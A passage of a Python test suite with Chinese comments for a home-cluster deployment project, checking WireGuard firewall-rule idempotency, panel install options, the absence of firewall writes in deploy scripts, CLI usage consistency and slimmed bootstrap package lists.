                subprocess.run(["bash", "-c", post_up], capture_output=True, env=env, timeout=240)
                log1 = Path(tmpdir / "run.log").read_text(encoding="utf-8")
                subprocess.run(["bash", "-c", post_up], capture_output=True, env=env, timeout=240)
                log2 = Path(tmpdir / "run.log").read_text(encoding="utf-8")

                if "-o end0" in log1:
                    log_pass("PostUp 在节点上按实际出口网卡 end0 做 MASQUERADE")
                else:
                    log_fail("PostUp 未取到实际出口网卡", log1[:200])
                if log1.count("-A FORWARD -i wg0 -j ACCEPT") == 1:
                    log_pass("首次执行添加转发规则")
                else:
                    log_fail("首次执行未添加规则", log1[:200])
                n_add_first = log1.count("-A FORWARD")
                n_add_total = log2.count("-A FORWARD")
                if n_add_total == n_add_first:
                    log_pass("重复执行不再堆叠规则 (-C 命中后跳过 -A)")
                else:
                    log_fail(f"规则重复堆叠: 第一次 {n_add_first} 次, 两次共 {n_add_total} 次")
                if "-C INPUT -p udp --dport 51820" in log1:
                    log_pass("入站放行同样先探测再添加")
                else:
                    log_fail("INPUT 规则未做幂等处理")
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


# ============ 测试26: 面板安装参数 (IP/端口/监听端口) ============
def test_panel_install_params():
    """测试 26: panel/install-service.sh 可设置面板 IP / 端口 / 监听端口

    三个概念刻意分开:
      监听地址 (bind 到哪张网卡) / 监听端口 (bind 到哪个端口) /
      访问地址 (浏览器里敲的面板 IP 或域名) —— 反代、NAT、SSH 转发都会
      让"访问"与"监听"不一致, 因此访问端口可单独指定。
    """
    print("\n" + "=" * 60)
    print("测试 26: 面板安装参数 (监听地址 / 监听端口 / 访问地址)")
    print("=" * 60)

    script = PANEL_DIR / "install-service.sh"
    if not script.exists():
        log_fail("panel/install-service.sh 缺失")
        return
    src = script.read_text(encoding="utf-8")

    # ---- 1) 静态检查 ----
    for opt in ["--host", "--port", "--url-host", "--url-port", "--yes"]:
        if opt not in src:
            log_fail(f"缺少选项 {opt}")
            break
    else:
        log_pass("提供 --host / --port / --url-host / --url-port / --yes")

    if "panel_env_set" in src:
        log_pass("参数写入面板环境文件")
    else:
        log_fail("参数没有落到 panel.env")

    if "EnvironmentFile=-" in src:
        log_pass("unit 引用 EnvironmentFile (文件缺失也不报错)")
    else:
        log_fail("unit 未引用环境文件")

    if "grep -v" in src and "PANEL_USER" not in src.split("panel_env_set")[1][:400]:
        log_pass("环境文件是合并写入 (不会冲掉账号密码)")
    else:
        log_warn("无法确认环境文件为合并写入")

    if "ONECLOUD_PANEL_TTY" in src:
        log_pass("交互开关可强制 (便于演练与自动化测试)")
    else:
        log_fail("交互分支无法在非 TTY 下演练")

    # ---- 2) 行为验证: mock systemctl + 临时 unit/env 路径 ----
    tmpdir = Path(tempfile.mkdtemp(prefix="oc_t26_"))
    mockbin = tmpdir / "mockbin"
    mockbin.mkdir()
    sc = mockbin / "systemctl"
    sc.write_text("#!/bin/bash\necho \"systemctl $*\" >> \"$SC_LOG\"\nexit 0\n",
                  encoding="utf-8", newline="\n")
    os.chmod(sc, 0o755)

    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    unit = tmpdir / "onecloud-panel.service"
    envf = tmpdir / "etc" / "onecloud" / "panel.env"

    def run_inst(args, stdin_data=None, env_extra=None):
        env = dict(os.environ)
        env["PATH"] = f"{_posix(mockbin)}:/usr/bin:/bin"
        env["ONECLOUD_PANEL_UNIT"] = _posix(unit)
        env["ONECLOUD_PANEL_ENV_FILE"] = _posix(envf)
        env["SC_LOG"] = _posix(tmpdir / "sc.log")
        for k in ("PANEL_HOST", "PANEL_PORT", "PANEL_URL_HOST", "PANEL_URL_PORT",
                  "ONECLOUD_PANEL_TTY"):
            env.pop(k, None)
        if env_extra:
            env.update(env_extra)
        kwargs = dict(capture_output=True, env=env, cwd=str(PROJECT_ROOT), timeout=120)
        if stdin_data is None:
            kwargs["stdin"] = subprocess.DEVNULL
        else:
            kwargs["input"] = stdin_data.encode("utf-8")
        r = subprocess.run(["bash", "panel/install-service.sh"] + args, **kwargs)
        return (r.returncode,
                r.stdout.decode("utf-8", "replace"),
                r.stderr.decode("utf-8", "replace"))

    def unit_env():
        if not unit.exists():
            return {}
        out = {}
        for line in unit.read_text(encoding="utf-8").splitlines():
            if line.startswith("Environment=PANEL_"):
                k, v = line.split("=", 1)[1].split("=", 1)
                out[k] = v
        return out

    try:
        # 参数路径
        rc, out, err = run_inst(["--host", "192.168.1.101", "--port", "9100",
                                 "--url-host", "panel.example.com",
                                 "--url-port", "19000"])
        ue = unit_env()
        if rc == 0 and ue.get("PANEL_HOST") == "192.168.1.101" and ue.get("PANEL_PORT") == "9100":
            log_pass("--host/--port 生效并写入 unit")
        else:
            log_fail(f"参数未生效 (rc={rc})", str(ue)[:200])
        if "http://panel.example.com:19000" in out and "经反代/NAT" in out:
            log_pass("访问地址与监听值不同时给出对外入口说明")
        else:
            log_fail("访问入口回显不正确", out[-200:])
        if envf.exists() and "PANEL_URL_PORT=19000" in envf.read_text(encoding="utf-8"):
            log_pass("访问参数落到 panel.env")
        else:
            log_fail("访问参数未落盘")

        # 非法监听地址: 网段地址 / 回环网段网络地址 / 组播
        for bad, expect in [("192.168.1.0", "网络地址"),
                            ("127.0.0.0", "回环网段"),
                            ("224.0.0.1", "组播")]:
            rc, out, err = run_inst(["--host", bad])
            if rc != 0 and expect in (out + err):
                log_pass(f"拒绝监听地址 {bad} 并说明原因 ({expect})")
            else:
                log_fail(f"未拒绝非法监听地址 {bad} (rc={rc})")

        # 非法端口 / 访问地址
        for args, label in [(["--port", "70000"], "端口超范围"),
                            (["--port", "abc"], "端口非数字"),
                            (["--url-host", "192.168.1.999"], "访问地址非法")]:
            rc, out, err = run_inst(args)
            if rc != 0 and "ERROR" in (out + err):
                log_pass(f"拒绝非法参数: {label}")
            else:
                log_fail(f"未拒绝非法参数: {label} (rc={rc})")

        # 环境变量注入 + --yes: 不应再询问
        rc, out, err = run_inst(["--yes"], env_extra={"PANEL_HOST": "127.0.0.1",
                                                     "PANEL_PORT": "9101"})
        ue = unit_env()
        if rc == 0 and ue.get("PANEL_HOST") == "127.0.0.1" and ue.get("PANEL_PORT") == "9101" \
                and "回车=" not in out:
            log_pass("env 注入 + --yes 时不询问 (init.sh 调用路径)")
        else:
            log_fail(f"env 注入路径异常 (rc={rc})", (out + err)[-200:])

        # 环境文件合并: 已有账号密码必须保留
        envf.parent.mkdir(parents=True, exist_ok=True)
        envf.write_text("PANEL_USER=admin\nPANEL_PASS=s3cret\nPANEL_HOST=0.0.0.0\n",
                        encoding="utf-8")
        rc, out, err = run_inst(["--host", "192.168.1.102", "--port", "9000", "-y"])
        content = envf.read_text(encoding="utf-8") if envf.exists() else ""
        if "PANEL_USER=admin" in content and "PANEL_PASS=s3cret" in content \
                and "PANEL_HOST=192.168.1.102" in content:
            log_pass("改写 panel.env 时保留账号密码, 只更新自己负责的键")
        else:
            log_fail("panel.env 被整份覆盖", content[:200])

        # 交互: 直接回车 = 默认值 0.0.0.0:9000
        rc, out, err = run_inst([], stdin_data="\n\n\n",
                                env_extra={"ONECLOUD_PANEL_TTY": "1"})
        ue = unit_env()
        if rc == 0 and ue.get("PANEL_HOST") == "0.0.0.0" and ue.get("PANEL_PORT") == "9000":
            log_pass("交互直接回车 = 默认 0.0.0.0:9000")
        else:
            log_fail(f"交互默认值异常 (rc={rc})", str(ue)[:200])

        # 交互: 非法值被拒后重新询问
        rc, out, err = run_inst([], stdin_data="192.168.1.0\n192.168.1.101\n9000\n\n\n",
                                env_extra={"ONECLOUD_PANEL_TTY": "1"})
        ue = unit_env()
        if rc == 0 and ue.get("PANEL_HOST") == "192.168.1.101" and "网络地址" in (out + err):
            log_pass("交互时非法监听地址被拒并要求重新输入")
        else:
            log_fail(f"交互拒绝非法值失败 (rc={rc})", str(ue)[:200])
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


def test_deploy_no_firewall():
    """测试 27: 部署脚本零防火墙写入 + 防火墙建议清单生成

    约定 (2026-09-15):
      1. onecloud 的部署脚本**不改节点防火墙** —— 不写 iptables/ip6tables,
         不下发 ufw / firewall-cmd / nft, 生成的 wg0.conf 默认也不带
         PostUp/PostDown 规则;
      2. 节点部署完毕后生成一份「防火墙设置建议清单」(docs/firewall/<节点>.txt),
         清单里的 DSL 行可直接录入 setup_firewall.sh;
      3. 真正调整防火墙的唯一入口是人手动执行 setup_firewall.sh。
    """
    print("\n" + "=" * 60)
    print("测试 27: 部署零防火墙改动 + 防火墙建议清单")
    print("=" * 60)

    rec = SCRIPTS_DIR / "firewall-recommend.sh"
    dep = SCRIPTS_DIR / "deploy.sh"
    wg = SCRIPTS_DIR / "wireguard-setup.sh"
    gk = PROJECT_ROOT / "node-wk-edge-01" / "wireguard" / "generate-keys.sh"
    init_sh = PROJECT_ROOT / "init" / "init.sh"
    missing = [str(p) for p in (rec, dep, wg, gk, init_sh) if not p.exists()]
    if missing:
        log_fail(f"必要文件缺失: {missing}")
        return

    # ---------------- A) 静态: 部署侧不出现"会写入"的防火墙命令 ----------------
    # 判定: 去掉注释与 heredoc 正文后, 以防火墙命令开头且带写动作的行 = 违规。
    #       (firewall-recommend.sh 的 heredoc 里是给人看的示例命令, 不算执行)
    fw_bin_re = re.compile(r"^(?:sudo\s+)?(iptables|ip6tables|nft|ufw|firewall-cmd)\b")
    fw_write_re = re.compile(
        r"(?<![-\w])(-A|-I|-D|-P|-F|-X|-N|-R)\b"
        r"|(?<![-\w])(add|delete|flush|allow|deny|enable|disable|reload)\b"
        r"|--(?:add|remove|permanent|reload|set-default-zone)"
    )

    def _executable_lines(path):
        """粗略取出"会真正执行"的行: 跳过注释与 heredoc 正文。"""
        out, heredoc = [], None
        for raw in path.read_text(encoding="utf-8", errors="replace").splitlines():
            if heredoc is not None:
                if raw.strip() == heredoc:
                    heredoc = None
                continue
            s = raw.strip()
            if not s or s.startswith("#"):
                continue
            m = re.search(r"<<-?\s*[\"']?([A-Za-z_][A-Za-z0-9_]*)[\"']?", raw)
            if m:
                heredoc = m.group(1)
            out.append(raw)
        return out

    scan_files = sorted(SCRIPTS_DIR.glob("*.sh")) + [init_sh, gk]
    offenders = []
    for f in scan_files:
        for ln, line in enumerate(_executable_lines(f), 1):
            s = line.strip()
            if not fw_bin_re.match(s):
                continue
            # 先把引号里的内容抹掉: `ufw status ... | grep -qi 'Default: allow'`
            # 是在**读**状态, 里面的 allow 不是动作。
            probe = re.sub(r"'[^']*'", "''", s)
            probe = re.sub(r'"[^"]*"', '""', probe)
            if fw_write_re.search(probe):
                offenders.append(f"{f.name}:{ln}: {s[:90]}")
    if not offenders:
        log_pass(f"部署侧 {len(scan_files)} 个脚本均无会写入的防火墙命令")
    else:
        log_fail("部署脚本里出现会改防火墙的命令",
                 "改防火墙只能由 setup_firewall.sh 执行:\n     " + "\n     ".join(offenders[:8]))

    wsrc = wg.read_text(encoding="utf-8")
    gsrc = gk.read_text(encoding="utf-8")
    for tag, src, has_flags in (("wireguard-setup.sh", wsrc, True),
                                ("generate-keys.sh", gsrc, False)):
        if 'WG_FIREWALL="${ONECLOUD_WG_FIREWALL:-0}"' in src:
            log_pass(f"{tag}: ONECLOUD_WG_FIREWALL 默认 0 (默认不写防火墙规则)")
        else:
            log_fail(f"{tag}: 缺少 WG_FIREWALL 默认关闭的判定")
        if has_flags:
            if "--with-wg-firewall" in src and "--no-wg-firewall" in src:
                log_pass(f"{tag}: 保留显式开关 (--with-wg-firewall / --no-wg-firewall)")
            else:
                log_fail(f"{tag}: 缺少显式开关")
        else:
            if "ONECLOUD_WG_FIREWALL=1" in src:
                log_pass(f"{tag}: 节点本地一次性脚本, 用 ONECLOUD_WG_FIREWALL=1 恢复自带规则")
            else:
                log_fail(f"{tag}: 未说明如何恢复自带规则")

    if "firewall-recommend.sh" in dep.read_text(encoding="utf-8"):
        log_pass("deploy.sh 分发完成后生成防火墙建议清单 (控制端静态生成, 不碰节点)")
    else:
        log_fail("deploy.sh 未接入建议清单生成")

    isrc = init_sh.read_text(encoding="utf-8")
    if "maint_fw_recommend" in isrc and "firewall-recommend.sh" in isrc:
        log_pass("init.sh 维护菜单提供「生成防火墙设置建议清单」入口")
    else:
        log_fail("init.sh 未提供建议清单入口")

    # ---------------- B/C 行为验证 ----------------
    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    tmpdir = Path(tempfile.mkdtemp(prefix="oc_t27_"))
    try:
        # 复制一份最小项目树: 让 wireguard-setup.sh 的产物落在临时目录里
        proj = tmpdir / "proj"
        shutil.copytree(SCRIPTS_DIR, proj / "scripts",
                        ignore=shutil.ignore_patterns("__pycache__"))
        shutil.copytree(PROJECT_ROOT / "inventory", proj / "inventory",
                        ignore=shutil.ignore_patterns("*.local.yaml", "*.bak"))

        # mock wg: genkey 输出固定私钥, pubkey 把 stdin 加前缀
        mockbin = tmpdir / "mockbin"
        mockbin.mkdir()
        (mockbin / "wg").write_text(
            "#!/bin/bash\n"
            'case "${1:-}" in\n'
            '  genkey) echo "cHJpdmF0ZS1rZXktZm9yLXRlc3QtMDAwMDAwMDAwMDAwMDA9" ;;\n'
            '  pubkey) sed "s/^/PUBKEY_/" ;;\n'
            "  *) exit 1 ;;\n"
            "esac\n", encoding="utf-8", newline="\n")
        try:
            os.chmod(mockbin / "wg", 0o755)
        except OSError:
            pass

        env = dict(os.environ)
        env["PATH"] = _posix(mockbin) + ":/usr/bin:/bin"
        env["BASH_ENV"] = ""
        env.pop("ONECLOUD_WG_FIREWALL", None)
        env.pop("ENV", None)

        def run_sh(argv, extra_env=None, cwd=proj, timeout=240):
            # 注意: argv 里的路径要用 POSIX 形式 (给 bash), 但 cwd 必须是
            # Windows 原生路径 —— Python 的 CreateProcess 不认 /d/... 形式。
            # timeout 240s: 被调脚本会内部再起 bash/awk/grep, Git Bash on
            # Windows 进程创建极慢, 60~120s 会出"脚本没问题但被 kill"的假失败。
            e = dict(env)
            if extra_env:
                e.update(extra_env)
            return subprocess.run(["bash"] + argv, env=e, cwd=str(cwd),
                                  capture_output=True, text=True,
                                  encoding="utf-8", errors="replace",
                                  stdin=subprocess.DEVNULL, timeout=timeout)

        wg_script = _posix(proj / "scripts" / "wireguard-setup.sh")
        conf = proj / "node-wk-edge-01" / "wireguard" / "wg0.conf"

        # ---- B1) 默认: wg0.conf 不带任何防火墙规则 ----
        r1 = run_sh([wg_script, "gen"])
        if r1.returncode == 0 and conf.exists():
            body = conf.read_text(encoding="utf-8", errors="replace")
            # 只看会生效的行: 注释里刻意留了"手工该怎么做"的示例命令, 那是说明
            bad = [l for l in body.splitlines()
                   if not l.lstrip().startswith("#")
                   and ("iptables" in l or "PostUp" in l or "PostDown" in l)]
            if not bad:
                log_pass("默认生成的 wg0.conf 不含生效的 PostUp/PostDown/iptables 行")
            else:
                log_fail("默认 wg0.conf 仍自带防火墙规则", "\n".join(bad))
            if "setup_firewall.sh" in body:
                log_pass("wg0.conf 内注明「防火墙规则由 setup_firewall.sh 统一管理」")
            else:
                log_fail("wg0.conf 未说明防火墙归属", "现场会误以为规则已由 wg 自带")
        else:
            log_fail(f"wireguard-setup.sh gen 未生成 wg0.conf (rc={r1.returncode})",
                     (r1.stdout + r1.stderr)[-400:])

        # ---- B2) 显式开关: 才写规则, 且幂等、不写死网卡 ----
        r2 = run_sh([wg_script, "gen"], extra_env={"ONECLOUD_WG_FIREWALL": "1"})
        if r2.returncode == 0 and conf.exists():
            body2 = conf.read_text(encoding="utf-8", errors="replace")
            if "PostUp" in body2 and "PostDown" in body2 and "iptables -C" in body2:
                log_pass("ONECLOUD_WG_FIREWALL=1 时才写 PostUp/PostDown, 且用 -C 探测 (幂等)")
            else:
                log_fail("显式开关未按预期生成规则",
                         "\n".join(l for l in body2.splitlines()
                                   if "Post" in l or "iptables" in l)[:400])
            if "-o eth0" in body2 or "-o end0" in body2:
                log_fail("MASQUERADE 写死了网卡", "玩客云可能是 end0, NAT 会静默失效")
            else:
                log_pass("MASQUERADE 的出网网卡由节点侧探测 (不写死 eth0/end0)")
        else:
            log_fail(f"开关模式下 gen 失败 (rc={r2.returncode})",
                     (r2.stdout + r2.stderr)[-300:])

        # ---- C1) 建议清单: DSL 语法 ----
        rec_path = _posix(rec)
        dsl = run_sh([rec_path, "--emit-dsl"], cwd=PROJECT_ROOT, timeout=300)
        lines = [l.strip() for l in dsl.stdout.splitlines() if l.strip()]
        dsl_re = re.compile(
            r"^(in|out)\s+(accept|drop)\s+(tcp|udp|any)\s+(\S+)\s+(\S+)\s+(\S+)$")
        bad_lines = [l for l in lines if not dsl_re.match(l)]
        if lines and not bad_lines:
            log_pass(f"建议清单输出 {len(lines)} 条 DSL 行, 全部符合 6 列语法 (可直接录入)")
        else:
            log_fail("建议清单 DSL 行格式不合法",
                     f"bad={bad_lines[:3]} lines={lines[:3]}")

        not_accept = [l for l in lines if not l.startswith("in accept")]
        if lines and not not_accept:
            log_pass("建议清单只给放行建议 (无 drop/out 行, 不替用户做封禁决策)")
        elif not_accept:
            log_fail("建议清单里混入了非放行建议", str(not_accept[:3]))

        # ---- C2) 端口来源与 services.yaml / 节点清单一致 ----
        got = set()
        for l in lines:
            m = dsl_re.match(l)
            if m:
                got.add((m.group(3), m.group(4)))
        need = [("tcp", "22"), ("udp", "51820"), ("tcp", "9000"), ("tcp", "3000"),
                ("udp", "53"), ("tcp", "9090"), ("tcp", "8123"), ("tcp", "8080"),
                ("tcp", "8083"), ("tcp", "8384"), ("tcp", "22000"), ("udp", "21027"),
                ("tcp", "6800"), ("tcp", "631"), ("tcp", "222")]
        absent = [f"{p}/{n}" for p, n in need if (p, n) not in got]
        if not absent:
            log_pass(f"清单覆盖 {len(need)} 个清单声明的端口 (SSH/面板/WG/host 网络/容器映射)")
        else:
            log_fail("清单漏了 services.yaml 里声明的端口", f"缺失: {absent}")

        # ---- C3) 完整报告: 变量端口要显式提示人工确认 ----
        rep = run_sh([rec_path, "--stdout"], cwd=PROJECT_ROOT, timeout=300)
        text = rep.stdout
        if "onecloud 的部署脚本不会改防火墙" in text and "setup_firewall.sh" in text:
            log_pass("清单开宗明义说明「部署脚本不改防火墙」并指明唯一执行入口")
        else:
            log_fail("清单未说明防火墙归属")

        edge_txt = rep.stdout.split(" OneCloud 防火墙建议清单 — wk-iot-02")[0]
        iot_txt = text.split(" OneCloud 防火墙建议清单 — wk-iot-02")[-1]
        if "MASQUERADE" in edge_txt and "sysctl" in edge_txt:
            log_pass("Hub 节点给出 WireGuard 转发/NAT 命令段 (DSL 表达不了的部分)")
        else:
            log_fail("Hub 节点缺少 FORWARD/NAT 命令段", "wg 客户端会上不了网")
        if "MASQUERADE" not in iot_txt:
            log_pass("非 Hub 节点不给转发/NAT 命令段 (避免误导)")
        else:
            log_fail("非 Hub 节点也给了转发命令")

        if "MEMOS_PORT" in text and "人工确认" in text:
            log_pass("变量端口 (如 ${MEMOS_PORT}) 单独列出要求人工确认, 未静默丢弃")
        else:
            log_fail("变量端口被静默丢弃", "清单必须显式提示人工确认")

        # ---- C4) 落盘 ----
        outdir = tmpdir / "fwout"
        r5 = run_sh([rec_path, "--out", _posix(outdir)], cwd=PROJECT_ROOT, timeout=300)
        made = sorted(p.name for p in outdir.glob("*.txt")) if outdir.exists() else []
        if r5.returncode == 0 and len(made) >= 3:
            okfile = all("in accept tcp 22" in (outdir / n).read_text(
                encoding="utf-8", errors="replace") for n in made)
            if okfile:
                log_pass(f"建议清单按节点落盘: {', '.join(made)}")
            else:
                log_fail("落盘的清单缺少 SSH 放行行", str(made))
        else:
            log_fail(f"建议清单落盘失败 (rc={r5.returncode})", (r5.stdout + r5.stderr)[-300:])

    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


# ============ 测试 28: 脚本 usage 与实现的一致性 ============
def _usage_text(path: Path) -> str:
    """取脚本 usage() 里 heredoc 的文本"""
    m = re.search(r"cat <<\s*'?EOF'?\n(.*?)\nEOF", path.read_text(encoding="utf-8"), re.S)
    return m.group(1) if m else ""


def _case_branch_tokens(src: str, var: str):
    """取 `case "$var" in ... esac` 的分支标签 (a|b) 展开后的 token 集合

    同一个变量可能被多个 case 匹配 (例如先做 --help / 合法性校验, 再进主分发),
    所以取全部出现位置的并集。
    """
    toks = set()
    found = False
    for m in re.finditer(r'case "\$' + re.escape(var) + r'" in\n(.*?)\nesac', src, re.S):
        found = True
        for line in m.group(1).splitlines():
            mm = re.match(r"^\s{4}([^\s)]+)\)\s*(;;)?\s*$", line)
            if mm:
                for t in mm.group(1).split("|"):
                    t = t.strip().strip('"')
                    if t:
                        toks.add(t)
    return toks if found else None


def test_cli_usage_contract():
    """测试 28: 脚本 usage 承诺的能力必须真的实现

    这类问题不会让脚本报错, 只会让照文档操作的人失败:
      - usage 列了 `data`, case 里没有 -> 照抄必错 (backup.sh 曾如此)
      - 恢复白名单只有 6 个服务 -> 备份得到却恢复不了 (restore.sh 曾如此)
    所以这里对「声明 vs 实现」做双向比对, 并对关键路径做一次真实执行。
    """
    print("\n" + "=" * 60)
    print("测试 28: 脚本 usage 与实现一致性 (CLI 契约)")
    print("=" * 60)

    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    def run_sh(args, env_extra=None, timeout=120):
        env = dict(os.environ)
        if env_extra:
            env.update(env_extra)
        return subprocess.run(["bash"] + args, cwd=str(PROJECT_ROOT),
                              capture_output=True, text=True, encoding="utf-8",
                              errors="replace", stdin=subprocess.DEVNULL,
                              timeout=timeout)

    try:
        # ---- A. backup.sh: usage 声明的类型 <-> case 分支 ----
        bpath = SCRIPTS_DIR / "backup.sh"
        bsrc = bpath.read_text(encoding="utf-8")
        busage = _usage_text(bpath)
        declared = {m.group(1) for m in re.finditer(r"^  ([a-z]+)\s+\S", busage, re.M)}
        branches = _case_branch_tokens(bsrc, "BACKUP_TYPE")

        if branches is None:
            log_fail("backup.sh 未找到 case \"$BACKUP_TYPE\" 分发")
        else:
            miss = declared - branches
            hide = branches - declared - {"*", "-h", "--help"}
            if not miss:
                log_pass(f"backup.sh usage 声明的类型都有实现: {sorted(declared)}")
            else:
                log_fail("backup.sh usage 声明但 case 里没有分支", f"缺失: {sorted(miss)}")
            if not hide:
                log_pass("backup.sh 没有 usage 未声明的隐藏分支")
            else:
                log_fail("backup.sh 存在 usage 未声明的分支", f"多余: {sorted(hide)}")

        # ---- B. restore.sh: usage 恢复目标 <-> case 分支 ----
        rpath = SCRIPTS_DIR / "restore.sh"
        rsrc = rpath.read_text(encoding="utf-8")
        rusage = _usage_text(rpath)
        rt = re.search(r"恢复目标:\s*(.*)$", rusage, re.M)
        r_declared = set()
        if rt:
            for part in rt.group(1).split("|"):
                w = part.strip().split()
                if w:
                    r_declared.add(w[0])
        r_branches = _case_branch_tokens(rsrc, "RESTORE_TARGET")

        if not r_declared:
            log_fail("restore.sh usage 未声明恢复目标枚举")
        elif r_branches is None:
            log_fail("restore.sh 未找到 case \"$RESTORE_TARGET\" 分发")
        else:
            miss = r_declared - r_branches
            if not miss:
                log_pass(f"restore.sh usage 声明的恢复目标都有实现: {sorted(r_declared)}")
            else:
                log_fail("restore.sh usage 声明但 case 里没有分支", f"缺失: {sorted(miss)}")

        # ---- C. backup / restore 服务口径一致 (不得硬编码白名单) ----
        if re.search(r'KNOWN_SERVICES="\$\(service_names', rsrc):
            log_pass("restore.sh 服务清单来自 inventory (service_names), 无硬编码白名单")
        else:
            log_fail("restore.sh 仍在硬编码服务白名单",
                     "应当改成 KNOWN_SERVICES=\"$(service_names | tr '\\n' ' ')\"")

        both = all(re.search(r"node_of_service", s) for s in (bsrc, rsrc))
        if both:
            log_pass("backup.sh / restore.sh 都用 node_of_service 定位服务所在节点")
        else:
            log_fail("backup.sh / restore.sh 服务定位方式不一致")

        # ---- D. 真实执行: 非法类型不得留下空备份目录 ----
        tmp = Path(tempfile.mkdtemp(prefix="oc_t28_"))
        try:
            r = run_sh([_posix(bpath), "bogus"], {"BACKUP_DIR": _posix(tmp)})
            leftovers = [p.name for p in tmp.iterdir()]
            if r.returncode != 0 and not leftovers:
                log_pass("backup.sh 收到非法类型: 退出非 0 且不产生空备份目录")
            else:
                log_fail("backup.sh 非法类型处理不当",
                         f"rc={r.returncode} 残留={leftovers}")

            # 白名单外的服务也必须被识别 (ariang / cups-web / panel 曾被拒)
            rejected = []
            for svc in ("ariang", "cups-web", "panel", "adguard"):
                rr = run_sh([_posix(rpath), "20990101_000000", svc])
                if "无法识别的恢复目标" in (rr.stdout + rr.stderr):
                    rejected.append(svc)
            if not rejected:
                log_pass("restore.sh 接受全部 inventory 服务名 (含原先白名单外的 4 个)")
            else:
                log_fail("restore.sh 拒绝的服务名", ", ".join(rejected))
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

        # ---- E. 面板版本号由后端注入, 模板不硬编码 ----
        html = (PANEL_DIR / "templates" / "index.html").read_text(encoding="utf-8")
        appsrc = (PANEL_DIR / "app.py").read_text(encoding="utf-8")
        hardcoded = re.search(r"OneCloud Cluster v\d+\.\d+", html)
        if hardcoded:
            log_fail("index.html 页脚硬编码了版本号", hardcoded.group(0))
        elif "{{ version }}" in html and re.search(
                r'render_template\("index\.html",\s*version=', appsrc):
            log_pass("index.html 页脚版本号由后端注入 (改版本只需改一处)")
        else:
            log_fail("index.html 未使用后端注入的 version")

        # ---- F. 文档里写出来的命令必须对得上脚本实现 ----
        bad = []
        checked = 0
        for doc in ("README.md", "docs/operations.md", "init/README.md"):
            p = PROJECT_ROOT / doc
            if not p.exists():
                continue
            text = p.read_text(encoding="utf-8")
            for m in re.finditer(r"scripts/backup\.sh\s+([a-z]+)", text):
                sub = m.group(1)
                if sub in declared:
                    checked += 1
                else:
                    bad.append(f"{doc}: scripts/backup.sh {sub}")
        if not bad:
            log_pass(f"文档里出现的 backup.sh 子命令都真实存在 (校验 {checked} 处)")
        else:
            log_fail("文档引用了 backup.sh 不存在的子命令", "; ".join(sorted(set(bad))))

    except Exception as e:
        log_fail(f"CLI 契约验证错误: {str(e)}")
        return False

    return True


def test_bootstrap_pkg_slim():
    """测试 29: 初始化装包精简 —— 无头服务器不装桌面/图形与排障类工具

    背景: 目标机是玩客云 (无图形界面 / 1GB 内存 / eMMC)。此前 bootstrap 一次性装
    18 个包, 其中 vim/htop/iotop/net-tools/dnsutils/wget/unzip/fdisk/lsb-release/
    software-properties-common 与「无头服务器 + 部署流水线」的实际需要无关;
    software-properties-common 更是为 Ubuntu PPA 准备的, 在 Debian 上只带来额外依赖。
    现在分三档: 核心包默认装 / 可选包显式 --extra-pkgs 才装 / 桌面图形包永不装。
    """
    print("\n" + "=" * 60)
    print("测试 29: 初始化装包精简 (无头服务器)")
    print("=" * 60)

    boot = SCRIPTS_DIR / "bootstrap.sh"
    if not boot.exists():
        log_fail("scripts/bootstrap.sh 缺失")
        return
    src = boot.read_text(encoding="utf-8")

    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    # ---- 1) 静态: 三档清单齐备 ----
    base_m = re.search(r'^BASE_PKGS="([^"]*)"', src, re.M)
    opt_m = re.search(r'^OPT_PKGS_PRESET="([^"]*)"', src, re.M)
    deny_m = re.search(r'APT_GUI_DENY="([^"]*)"', src, re.S)
    if not (base_m and opt_m and deny_m):
        log_fail("缺少装包分档常量 (BASE_PKGS / OPT_PKGS_PRESET / APT_GUI_DENY)")
        return
    log_pass("具备装包分档常量 (核心 / 可选 / 桌面图形黑名单)")

    base = base_m.group(1).split()
    opt = opt_m.group(1).split()
    deny = set(deny_m.group(1).split())

    CORE = {"curl", "git", "ca-certificates", "jq", "rsync", "parted", "wireguard-tools"}
    if set(base) == CORE:
        log_pass(f"默认只装核心包 ({len(base)} 个): {' '.join(base)}")
    else:
        log_fail("默认装包清单与「核心集合」不一致",
                 f"多={sorted(set(base) - CORE)} 少={sorted(CORE - set(base))}")

    MOVED = {"wget", "vim", "htop", "iotop", "net-tools", "dnsutils", "unzip",
             "dosfstools", "fdisk", "lsb-release", "gnupg"}
    if MOVED <= set(opt):
        log_pass(f"调试/辅助类工具移出默认流程, 改为可选 ({len(MOVED)} 个)")
    else:
        log_fail("有工具被直接删除而不是改为可选", f"缺失: {sorted(MOVED - set(opt))}")

    both = set(base) & set(opt)
    if not both:
        log_pass("核心包与可选包无交集 (不会重复安装)")
    else:
        log_fail("核心包与可选包重复", sorted(both))

    if "software-properties-common" not in src:
        log_pass("不再安装 software-properties-common (Debian 无 PPA, 且会拉入额外依赖)")
    else:
        log_fail("仍在安装 software-properties-common")

    def _gui_hit(pkgs):
        hit = [p for p in pkgs if p in deny]
        hit += [p for p in pkgs
                if re.match(r"^(xserver-|x11-|xorg-|task-.*-desktop|.*-desktop|fonts-)", p)]
        return sorted(set(hit))

    g1, g2 = _gui_hit(base), _gui_hit(opt)
    if not g1 and not g2:
        log_pass(f"核心与可选清单均不含桌面/图形组件 (黑名单 {len(deny)} 项)")
    else:
        log_fail("清单里仍含桌面/图形组件", f"核心={g1} 可选={g2}")

    for fn in ("pkg_gui_name()", "pkg_gui_filter()", "extra_pkgs_apply()",
               "pkg_install_list()"):
        if fn in src:
            log_pass(f"提供 {fn}")
        else:
            log_fail(f"缺少 {fn}")

    # setup.sh 同样只补业务必需的命令
    ssrc = (SCRIPTS_DIR / "setup.sh").read_text(encoding="utf-8")
    if 'need+=("dosfstools")' not in ssrc and 'need+=("wget")' not in ssrc \
